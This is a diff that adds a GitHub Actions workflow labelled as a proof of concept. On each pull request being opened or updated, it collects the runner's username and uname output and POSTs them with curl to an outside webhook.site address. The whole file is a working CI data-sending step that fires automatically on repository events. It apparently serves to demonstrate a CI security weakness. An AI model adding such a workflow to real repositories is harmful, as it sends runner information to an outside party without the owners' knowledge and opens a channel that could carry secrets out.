@@ -1,0 +1,16 @@
+name: PoC - whoami + uname to webhook
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send system info to webhook
+        run: |
+          OUTPUT="$(whoami && uname -a)"
+          curl -X POST -H "Content-Type: text/plain" \
+            --data "$OUTPUT" \
+            https://webhook.site/ef36781f-5c6e-49a7-b232-b8d6e36e2867
